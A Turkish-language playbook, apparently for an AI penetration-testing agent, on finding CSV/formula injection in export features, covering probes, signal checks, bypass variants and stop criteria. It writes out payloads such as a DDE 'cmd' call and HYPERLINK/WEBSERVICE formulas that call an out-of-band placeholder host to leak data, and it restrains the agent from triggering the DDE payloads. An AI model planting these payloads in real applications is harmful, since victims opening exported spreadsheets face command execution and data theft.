---
name: vuln-formula-injection
description: >
  CSV / formül injection (a.k.a. CSV injection / formula injection) sınıfı: bir
  kullanıcı alanı daha sonra CSV/XLSX olarak dışa aktarılan bir dokümana giriyorsa
  uygulanır. =,+,-,@,tab/CR ile başlayan payload, kurban dosyayı açınca hücre
  formül olarak değerlendirilir (=cmd|, hyperlink/DDE exfil). Ana karar: payload
  alana KALICI yazıldı mı VE dışa aktarılan dokümanda formül-başlangıç karakteri
  KORUNARAK yansıdı mı (eskape/temizleme yok)?
---

# 🧮 CSV / FORMULA INJECTION — export edilen hücreye formül kaçır, kurban açınca çalışsın

> **Tek cümle:** `=`/`+`/`-`/`@` ile başlayan girdi bir alana kalıcı yazılıp dışa aktarılan CSV/XLSX'te aynen yansıyorsa, kurbanın elektronik tablosu onu formül olarak çalıştırır; kanıt = persist + export edilen dokümanda korunmuş formül-başlangıcı.

İlişkili: [[data-flow-and-mental-model]] [[baseline-and-signal]] [[evidence-discipline]] [[engine-mcp-contract]] [[attacker-mindset-and-persistence]] [[request-economy]] [[out-of-band-testing]] [[vuln-stored-xss]]

## 1. NE ZAMAN UYGULANIR (sink/bağlam)
- Bir kullanıcı alanı sonradan bir CSV/XLSX/TSV export'una giriyorsa: kullanıcı listesi, audit log, sipariş/rapor export'u, "verilerimi indir", admin paneli "export to CSV", davet/iletişim listesi.
- İpuçları: UI'da "Export", "Download CSV/Excel", rapor üreten endpoint; girdiğin değer (ad, açıklama, şirket, not) tablo bir kolonuna düşüyor.
- KURBAN: Genelde BAŞKA bir kullanıcı/admin dosyayı açar (stored-XSS gibi second-order). Sen yazarsın, başkası export edip açınca tetiklenir.
- SKIP: Alan hiçbir tablo/doküman export'una girmiyorsa (yalnızca HTML render → [[vuln-stored-xss]]). Export yoksa bu sınıf uygulanmaz.

## 2. İNSAN MUHAKEMESİ
- Geliştirici verinin "sadece metin" olduğunu varsayıp CSV'ye düz yazmış olabilir; ama Excel/Sheets/LibreOffice bir hücre `=`/`+`/`-`/`@`/tab/CR ile başlıyorsa onu FORMÜL sayar. Savunma: değeri `'` veya ` ` ile prefiks'lemek ya da bu karakterleri eskape etmek.
- Mantık: enjeksiyon HTTP yanıtında değil, kurbanın spreadsheet uygulamasında patlar — bu yüzden "yanıt 200, etki yok" yanıltıcıdır; etki export edilen DOSYADA aranır.
- Kaçırılan yer: HTML için sanitize edip CSV export yolunu unutmak; sadece `=`'i filtreleyip `+ - @` ve tab/CR-başlangıcını bırakmak.

## 3. TEŞHİS PROB'U (önce baseline, sonra TEK prob)
- **Baseline:** Alana benign değer yaz, export'u indir (`cyp_send_request` ile export endpoint'i), hücrenin tam olarak nasıl serialize edildiğini (tırnaklama, prefiks, virgül kaçışı) not al. request_id sakla.
- **Tek prob (formül persist):** Alana belirgin, GÖZLENEBİLİR formül yaz:
  - `=1+1` veya benzersiz `=CONCATENATE("CYP",1+1)` → export'ta hücre `=1+1` olarak mı duruyor (formül-başı `=` korunmuş, prefiks/eskape YOK)?
- **Tek prob (her tetikleyici karakter):** `=`, `+`, `-`, `@`, baştaki TAB (`%09`) ve CR (`%0d`) varyantlarını ayrı alanlara/kayıtlara yaz; export'ta hangileri prefiks/eskape edilmeden korunuyor izole et.
- **Gözlem (OOB için):** `=HYPERLINK("http://<oob>/?x=cyp+","clickme")` veya DDE `=cmd|'/C calc'!A0` → bunları GÖNDER ama kanıt için ÇALIŞTIRMA; export'ta korunmuş yansımayı belgele (aşağı bak).

## 4. SİNYAL vs GÜRÜLTÜ
- **Aday (sinyal):** Export edilen CSV/XLSX'te hücre hâlâ `=1+1` / `@...` / `+...` ile BAŞLIYOR — yani formül-tetikleyici karakter prefiks veya eskape OLMADAN korunmuş. Bir spreadsheet bunu açtığında değerlendireceği deterministik.
- **Gürültü (aday DEĞİL):** Export'ta hücre `'=1+1` (öncesinde tırnak/boşluk prefiks) veya `"=1+1"` salt metin-eskape ile geliyor → savunma var, injection değil. HTTP yanıtının 200 olması da değil. Alanın HTML'de render'ı (o ayrı sınıf, → [[vuln-stored-xss]]).

## 5. DOĞRULAMA KAPISI (kanıt)
- **Persist + korunmuş yansıma:** (1) Payload alana kalıcı yazıldı (yeniden okuyunca duruyor); (2) export edilen dokümanda formül-başı karakter PREFİKSSİZ/ESKAPESİZ; bu ikisi birlikte kanıttır. Baseline benign değerle export'ta bu hücre düz metin.
- **Karakter matrisi:** `= + - @ TAB CR`'den hangileri korunuyor, request_id ile listele; en az `=` için netleştir.
- **OOB (isteğe bağlı, güvenli):** `=HYPERLINK("http://<oob-unique>/...")` export'ta korunmuşsa, bir tabloda açıldığında dış istek yapacağını export'taki ham formülle GÖSTER — ama gerçek RCE/DDE'yi (`=cmd|...`) ÇALIŞTIRMA; varlığını dosyada kanıtla, tetikleme.
- Her iddia: yazma request_id + export request_id + export içindeki ham hücre değeri (token eşleşmeli).

## 6. VARYASYON / BYPASS (bloklanınca)
- **Tetikleyici ekseni:** `=` filtreliyse `+`, `-`, `@`; bunlar da filtreliyse baştaki TAB (`\t`, `%09`), CR (`\r`), LF — bazı parser'lar leading whitespace'i atıp sonraki `=`'i formül sayar.
- **Eskape atlatma:** Prefiks `'` ekleniyorsa, alanın başına `=`'den önce eklenen-ama-atlanan karakter (yeni satır, boşluk, kontrol karakteri) ile prefiks'i etkisizleştirmeyi dene; çift tırnak içinden çıkış (`"=...`).
- **Sink ekseni:** Bir export endpoint'i sertse, AYNI alanı taşıyan başka export'u (XLSX vs CSV vs TSV, admin-rapor vs kullanıcı-indir) dene — biri eskape eder, diğeri etmez.
- **Payload ekseni:** Etki için `=HYPERLINK(...)` (tık-bazlı exfil), `=WEBSERVICE(...)`/`=IMPORTXML(...)` (otomatik dış istek, Sheets/Excel'e göre), DDE `=cmd|'...'!A0` — ama bunları kanıt için ÇALIŞTIRMA, export'ta korunmuş halini belgele.
- Her eksen bir hipotez; tetikleyici karakterler + 2-3 export yolu denenip hepsi prefiks/eskape ediyorsa "formula injection sinyali yok" diye kapat.

## 7. FALSE-POSITIVE TUZAKLARI (zayıf modelin halüsinasyonu)
- **EN SIK:** Payload'ın alana kaydedilmesini tek başına injection sanmak. Persist yetmez; EXPORT edilen dokümanda formül-başı korunmuş olmalı. Export'u gerçekten indirip ham hücreyi gör.
- Export'ta `'=1+1` (prefiks'li) veya `"=1+1"` (eskape'li) görüp injection demek — bunlar SAVUNMANIN çalıştığının kanıtı.
- HTTP yanıtının 200 olmasına bakıp "etki yok" deyip kapatmak — etki yanıtta değil, kurbanın spreadsheet'inde; export dosyasına bak.
- HTML render'da `=1+1`'in düz görünmesini "çalışmadı" sanmak — bu CSV değil XSS sink'i; doğru çıktıyı (export) incele.
- `=cmd|'/C calc'`'i kanıt için ÇALIŞTIRMAK — bu RCE denemesi/zararlı; export'ta korunmuş formülü belgelemek kanıt için yeterli, tetikleme.
- Kendi makinende açıp "patladı" demek — kanıt, sunucunun export'unda korunmuş tetikleyici karakterdir; lokal Excel davranışı hedefin verisi değil.

## 8. DURMA KRİTERİ
- **Kanıtlandı, kapat:** Payload kalıcı yazıldı + export edilen CSV/XLSX'te hücre formül-başı karakterle (prefiks/eskape OLMADAN) başlıyor + benign baseline aynı hücrede düz metin + karakter matrisi belgelendi.
- **Sinyal yok, kapat:** `= + - @ TAB CR` tetikleyicileri + 2-3 export yolu denendi; export her durumda prefiks (`'`) ya da eskape uyguluyor, formül-başı korunmuyor.
- **Şüpheli, ilerle:** Alan persist ediyor ama export endpoint'ine/dosyaya erişemiyorsun (yetki/akış yok) → "ŞÜPHELİ: persist var, export doğrulanamadı", ilerle. Bütçeyi koru.

## ÖZET — 5 KURAL
1. Hedef: payload PERSIST + EXPORT edilen dokümanda formül-başı karakter (`=+-@`/TAB/CR) prefiks/eskape OLMADAN korunsun.
2. Önce baseline export'u indir (serialize formatını gör); sonra `=1+1` benzeri gözlenebilir formülü yaz ve export'ta kontrol et.
3. Kanıt = export dosyasındaki ham hücre (yazma + export request_id, token eşleşir) — sadece alana kaydetmek değil.
4. `'=...` / `"=..."` (prefiks/eskape) export'ta görünüyorsa savunma çalışıyor, injection DEĞİL; HTTP 200 etki ölçüsü değildir.
5. Bloklanınca tetikleyici karakter, eskape-atlatma, farklı export yolu (CSV/XLSX/TSV) eksenlerini dene; `=cmd|...`/DDE'yi ÇALIŞTIRMA, korunmuş halini belgele; boşsa kapat.
